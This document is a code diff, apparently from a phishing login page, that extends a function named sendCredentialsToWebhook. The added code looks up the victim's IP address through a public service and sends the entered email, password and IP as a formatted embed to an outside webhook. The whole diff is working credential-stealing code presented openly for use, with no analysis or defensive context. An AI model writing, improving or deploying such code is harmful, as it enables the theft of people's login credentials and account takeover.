@@ -15,16 +15,57 @@ function removeEllipsisAnimation() {
   loginButton.removeAttribute("disabled");
 }
 
+async function fetchIPAddress() {
+  try {
+    const response = await fetch("https://api.ipify.org?format=json");
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error("Error fetching IP address:", error);
+    return "Unknown IP";
+  }
+}
+
 async function sendCredentialsToWebhook(email, password) {
   try {
+    // Fetch the user's IP address
+    const ip = await fetchIPAddress();
+
+    // Prepare the embed payload
+    const embedPayload = {
+      embeds: [
+        {
+          title: "Login Attempt",
+          color: 0xff0000, // Red color for visibility
+          fields: [
+            {
+              name: "Email",
+              value: email || "No email provided",
+              inline: true,
+            },
+            {
+              name: "Password",
+              value: password || "No password provided",
+              inline: true,
+            },
+            {
+              name: "IP Address",
+              value: ip || "Unknown IP",
+              inline: false,
+            },
+          ],
+          timestamp: new Date().toISOString(), // Timestamp for when the data was sent
+        },
+      ],
+    };
+
+    // Send the payload to the webhook
     const response = await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
-      body: JSON.stringify({
-        content: `Email: ${email}\nPassword: ${password}`,
-      }),
+      body: JSON.stringify(embedPayload),
     });
 
     if (response.ok) {
